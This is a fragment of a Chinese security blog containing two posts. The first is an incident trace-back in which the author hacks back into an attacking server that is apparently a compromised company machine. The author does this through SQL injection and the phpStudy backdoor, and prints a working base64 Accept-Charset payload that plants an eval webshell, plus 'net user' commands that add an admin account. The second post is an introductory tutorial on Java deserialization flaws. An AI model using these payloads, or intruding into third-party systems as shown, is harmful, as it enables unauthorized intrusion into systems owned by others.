        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>一次恶意扫描触发的告警，溯源排查攻击源IP，简单记一下这次的溯源排查流程。</p><h2 id="0x01、告警"><a href="#0x01、告警" class="headerlink" title="0x01、告警"></a>0x01、告警</h2><p>可以看是<font color="red">同一时间</font>的告警，受害IP为该C段下的三台业务服务器，触发的三条告警，可直接判断为<font color="red">恶意扫描</font>。</p><p><img src="/posts/777da932/gj-1.png" title="告警"> </p><p>查看攻击流量http报文，可看到phpstudy的后门利用payload，排除误报。</p><p><img src="/posts/777da932/gj-2.png" title="告警报文"><br><img src="/posts/777da932/gj-3.png" title="告警payload"> </p><h2 id="0x02、溯源排查"><a href="#0x02、溯源排查" class="headerlink" title="0x02、溯源排查"></a>0x02、溯源排查</h2><p>针对攻击源IP，进行常规溯源流程（威胁情报、域名反查、IP端口开放情况、可利用的漏洞等）</p><h3 id="攻击源IP情况："><a href="#攻击源IP情况：" class="headerlink" title="攻击源IP情况："></a>攻击源IP情况：</h3><p>直接丢ti、微步、360威胁情报同理，取有用信息。</p><p><img src="/posts/777da932/pc-1.png" title="威胁情报"> </p><p>攻击源ip：绵阳阿里云<br>有用信息就只有反查域名，注册过m.xxx.cn，还有一些其他域名，查了没啥有用的。<br>查看m.xxx.cn域名信息，该域名为一家装饰公司备案的，也有备案号。</p><p><img src="/posts/777da932/pc-2.png" title="域名查询"> </p><p>同时ping该域名也是正常解析到攻击源IP上的，说明当前域名与攻击IP是绑定匹配的，时效期内。</p><p><img src="/posts/777da932/pc-3.png" title="域名IP绑定"> </p><p>同时威胁情报也能看到对应开放的端口，但大部分时效性不强，可以结合fofa查看或者自己扫描攻击源IP开放的端口。<br>扫描查看到攻击源IP开放了80、3389、8085等端口。<br>访问web页面，访问跳转&#x2F;index2.php页面，标题为屠龙之怒，与该公司名称xx装饰集团四川有限公司业务不符，疑为该公司网站被挂黑链，服务器被当作跳板对外发出恶意扫描。</p><p><img src="/posts/777da932/pc-4.png" title="web应用"> </p><p>攻击源IP简述:<br>1、绵阳阿里云服务器<br>2、注册域名为m.xxx.cn，为某装修公司，域名与IP绑定匹配。<br>3、web应用跳转游戏，疑似被挂黑页，疑为肉鸡。</p><h3 id="攻击源IP反制："><a href="#攻击源IP反制：" class="headerlink" title="攻击源IP反制："></a>攻击源IP反制：</h3><p>一来就看游戏入口去了，一个游戏页面，简单抓了包</p><p><img src="/posts/777da932/fz-1.jpg" title="登录"> </p><p>存在用户，但没啥关系，存在sql注入，查看了库，只有test库（&#x2F;不对劲，交互连接的库名不是这个），但不能查询内容。</p><p><img src="/posts/777da932/fz-2.png" title="sql注入"> </p><p>–os-shell一把嗦。</p><p><img src="/posts/777da932/fz-3.jpg" title="sql注入"> </p><p>权限不够，权限不足，–file-read啥的也是没权限直接过。<br>于此同时目录也早扫完了，查看了一下，看到早就已经被挂了马了，肉鸡没跑了。</p><p><img src="/posts/777da932/fz-4.png" title="目录扫描"> </p><p>查看了下漏扫结果，存在phpstudy后门，才反应过来本来就是肉鸡，一个劲对外扫phpstudy后门，黑页的游戏也是phpstudy部署的，本身就有后门</p><p><img src="/posts/777da932/fz-5.png" title="漏洞扫描"> </p><p>顺其自然通过Phpstudy后门写文件获取shell</p><p><img src="/posts/777da932/fz-6.png" title="payload"> </p><p>手工直接请求头添加下面payload即可，同时删除原本的Accept-Encoding改成下面的，&#x2F;&#x2F;开始忘删了导致没生效，蠢死。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInVwZGF0ZSJdKT9ePj5DOlxMVF9TZXJ2ZXJccGhwU3R1ZHlcV1dXXHVwZGF0ZTF0ZXN0LnBocCcpOw==</span><br></pre></td></tr></table></figure><p><img src="/posts/777da932/fz-7.png" title="发送payload"> </p><h3 id="攻击源IP服务器分析："><a href="#攻击源IP服务器分析：" class="headerlink" title="攻击源IP服务器分析："></a>攻击源IP服务器分析：</h3><p>其中查看数据发现系统存在可见内最早的webshell为2019-10-15日,文件名为test.php(不确定是否为文件真正上传建立的日期)</p><p><img src="/posts/777da932/sy-1.png" title="webshell"> </p><p>以及2022-10-10 01:28创建的webshell，文件名称为phpshell.php，同时期上传的cs马</p><p><img src="/posts/777da932/sy-2.png" title="webshell"> </p><p>但该攻击者未进行其他的相关操作，仅获取服务器权限后看了一下，未发现其他操作。<br>于此同时，发现被添加的影子账户loxxxxo$,并且在这个影子账户的桌面上传了phpstudy的批量扫描后门利用工具，以及一些扫描记录和扫描的目标网段</p><p><img src="/posts/777da932/sy-3.png" title="记录"><br><img src="/posts/777da932/sy-4.png" title="记录"> </p><p>通过创建影子账户登录服务器，本身就开了3389，就不用再开启端口了</p><p><img src="/posts/777da932/sy-5.png" title="创建账户"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user xxx /add  //添加管理员账户</span><br><span class="line">net localgroup administrators xxx /add  //将添加的管理员账户加入管理员组</span><br></pre></td></tr></table></figure><p>利用工具的一些扫描记录</p><p><img src="/posts/777da932/sy-6.png" title="利用工具"> </p><p>同时该影子用户还上传了一些黑灰产软件，运行挂起获取收益</p><p><img src="/posts/777da932/yz-1.png" title="挂起收益"> </p><p>一个月内获得的积分收益</p><p><img src="/posts/777da932/yz-2.png" title="挂起收益"> </p><h3 id="攻击源IP-loxxxxo影子用户分析："><a href="#攻击源IP-loxxxxo影子用户分析：" class="headerlink" title="攻击源IP loxxxxo影子用户分析："></a>攻击源IP loxxxxo影子用户分析：</h3><p>通过查看服务器端口连接情况发现与该服务器3389远程连接有一个IP 175.xxx.xxx.138（上海 腾讯云），极大可能也为肉鸡。</p><p><img src="/posts/777da932/yz-3.png" title="连接情况"> </p><p>同时查看当前服务器在线用户，该影子用户loxxxxo$处于连接在线状态，也就是说上述的175.xxx.xxx.138的腾讯云服务器即为该影子用户的远程连接主机。</p><p><img src="/posts/777da932/yz-4.png" title="在线情况"> </p><p>通过信息查看loxxxxo$用户创建时间为2022年9月20日（不排除为后续修改密码后的时间）（因此说明10号上传的webshell的攻击者与该用户不为同一人）。</p><p><img src="/posts/777da932/yz-5.png" title="创建情况"> </p><p><strong>简述该用户信息：</strong><br>1、影子用户：loxxxxo$<br>2、远程连接主机：175.xxx.xxx.138（上海 腾讯云）<br>3、9月20日甚至跟早入侵该攻击源IP并作为跳板对外扫描Phpstudy后门，同时利用入侵主机部署黑灰产软件获益。<br>4、其中一个黑灰产软件使用的他的会员号：AG-xxx</p><h3 id="后续思路："><a href="#后续思路：" class="headerlink" title="后续思路："></a>后续思路：</h3><p>1、针对175.xxx.xxx.138攻击主机，简单看了一下，开了80端口 但没什么应用部署，也没查到相关威胁情报信息，极大可能也为跳板机。<br>2、针对黑灰产软件上的会员号信息，涉及到网站jingxxx.taxxx.com，意思得获取这个网站权限在查相关用户信息，工作量较大，仅思考了下。</p><h3 id="总结事件线："><a href="#总结事件线：" class="headerlink" title="总结事件线："></a>总结事件线：</h3><p>该源IP被很早入侵并使用phpstudy部署了几套web游戏系统——&gt;真实攻击者持有IP175.xx.xx.138通过phpstudy后门扫到该服务器存在后门，并通过后门获取服务器权限，同时创建了影子账户loxxxxo$——&gt;该用户上传黑灰产软件运行挂机收益，同时定期使用Phpstudy批量扫描工具对全网扫描——&gt;10月10日凌晨扫描至单位业务系统服务器触发告警。</p><h2 id="0x03、总结"><a href="#0x03、总结" class="headerlink" title="0x03、总结"></a>0x03、总结</h2><p>本次溯源并未实际溯源到真实用户，排查过程也很仓储，也没去找最开始的入侵痕迹，简单排查告警触发后的溯源分析过程，了解攻击者的入侵思路和入侵意图，再进一步的话可能从后续思路再入手，但可能短时间获取不到有用信息，就先这样记录下吧。</p>]]></content>
      
      
      <categories>
          
          <category> 实战记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识反序列化</title>
      <link href="/posts/45180cd1.html"/>
      <url>/posts/45180cd1.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>学习java基础知识记录，方便查阅。</p><h2 id="0x01、反序列化是什么？有什么用？"><a href="#0x01、反序列化是什么？有什么用？" class="headerlink" title="0x01、反序列化是什么？有什么用？"></a>0x01、反序列化是什么？有什么用？</h2><blockquote><p>  Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 </p></blockquote><p>java序列化会更有利于传输，它的速度会更快，并且也会更安全，被调用方序列化，调用方反序列化即能够得到传输之前的最原始的java对象，常常用来做不同进程之间的对象传输。能够更加便于储存，不论是存储成文件又或者是存储成数据库都是可以的，存储成文件，下次要用可以直接反序列拿到对象。</p><h2 id="0x02、反序列化如何实现"><a href="#0x02、反序列化如何实现" class="headerlink" title="0x02、反序列化如何实现"></a>0x02、反序列化如何实现</h2><p>实现方法：通过该对象所处类实现<font color="red">Serializable</font>接口，调用<font color="red">writeObject()</font>方法序列化、<font color="red">readObject()</font>方法反序列化分别对对象进行数据转换的写入和读取。</p><p><font color="red">writeObject()</font>序列化：将java对象转换成java字节序列、json、xml等数据格式的过程，利用ObjectOutputStream流接口把对象序列化数据写入文件。<br><font color="red">readObject()</font>反序列化：将java字节序列、json、xml等数据格式还原成java对象的过程，利用ObjectInputStream流接口把序列化文件读取并恢复成对象。</p><p>一个类的对象要想序列化成功，必须满足两个条件：<br>1、该类必须实现 java.io.Serializable 接口。<br>2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。<br>注：不可序列化的属性：带static修饰（静态变量）和transient修饰（临时变量）的属性，对于transient属性序列化机制会跳过而不会将其写入文件，但在读取时也不可恢复，该属性值保持默认初始化值。</p><h2 id="0x03、反序列化代码实现demo"><a href="#0x03、反序列化代码实现demo" class="headerlink" title="0x03、反序列化代码实现demo"></a>0x03、反序列化代码实现demo</h2><p>新建java项目，创建pack包，新建java程序，不赘述了。</p><h3 id="类对象："><a href="#类对象：" class="headerlink" title="类对象："></a>类对象：</h3><p>创建people类，并实现<font color="red">Serializable</font>接口</p><p><img src="/posts/45180cd1/classpeople.png" title="people类"></p><h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><p>创建demo类，实现对people类对象调用并实例化输出</p><p><img src="/posts/45180cd1/ser.png" title="序列化过程"></p><p>查看输出txt为序列化数据</p><p><img src="/posts/45180cd1/sertxt.png" title="序列化结果"></p><p>生成的数据文件为16进制，乱码显示以  sr开头</p><blockquote><p>  java原生序列化的16进制是以aced00057372开头、base64编码是以rO0ABXNy开头</p></blockquote><h3 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h3><p>创建unser类，实现对序列化文件进行反序列化读取并输出。</p><p><img src="/posts/45180cd1/unser.png" title="序列化结果"></p><p>以上过程为一个简单的序列化与反序列化的过程。</p><h2 id="0x04、安全成因"><a href="#0x04、安全成因" class="headerlink" title="0x04、安全成因"></a>0x04、安全成因</h2><p>与其说是漏洞成因，不妨说是安全成因，单从上述的反序列化过程似乎没发现怎么变成常谈的java反序列化漏洞，既然是反序列化漏洞，那重点就在反序列化上，即readObject()方法;<br>学习总结的漏洞成因要素：<br>1、readObject()方法被重写，当实现Servializable类并重写了readObject()方法，系统执行反序列化时会调用重写的readObject()方法。<br>2、重写的readObject()方法含有危险方法，如方法中直接执行Runtime.getRuntime().exec();<br>3、重写的readObject()方法中存在调用其它类的可控变量并执行危险函数。<br>4、套娃3步骤，调用其它类中变量再次调用另外一个类中的方法。#可以理解为常说的gadget链，通俗点说就是漏洞利用链。</p><h3 id="案例demo-1"><a href="#案例demo-1" class="headerlink" title="案例demo-1"></a>案例demo-1</h3><p><strong>重写readObject方法并直接执行危险函数</strong><br>实现Servializable类的实例类重写了readObject()方法，readObject()方法执行了危险函数。</p><p><img src="/posts/45180cd1/anli-1.png" title="readObject方法重写"></p><p>这是执行反序列化步骤 发现危险函数被执行</p><p><img src="/posts/45180cd1/anli-2.png" title="危险函数被执行"></p><p>通过调试可以认证这点<br>在调用readObject()方法处下断点</p><p><img src="/posts/45180cd1/anli-3.png" title="调试"></p><p>可看到调用重写的readObject()方法</p><p><img src="/posts/45180cd1/anli-3-1.png" title="调试"></p><h3 id="案例demo-2"><a href="#案例demo-2" class="headerlink" title="案例demo-2"></a>案例demo-2</h3><p><strong>重写readObject方法，方法中调用了其他类中的危险方法</strong><br>新建立一个exec类，其中exec类使用了危险函数。</p><p><img src="/posts/45180cd1/anli-4-1.png" title="exec类"></p><p>重写readObject方法，方法中调用了exec类对象。</p><p><img src="/posts/45180cd1/anli-4-2.png" title="readObject方法重写"></p><p>同样运行反序列化操作，同样实现了反序列化漏洞，执行了命令</p><p><img src="/posts/45180cd1/anli-4-3.png" title="readObject方法重写"></p><p>上诉案例仅提供漏洞造成原理思路，实际漏洞调用链远比其复杂例如cc链。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
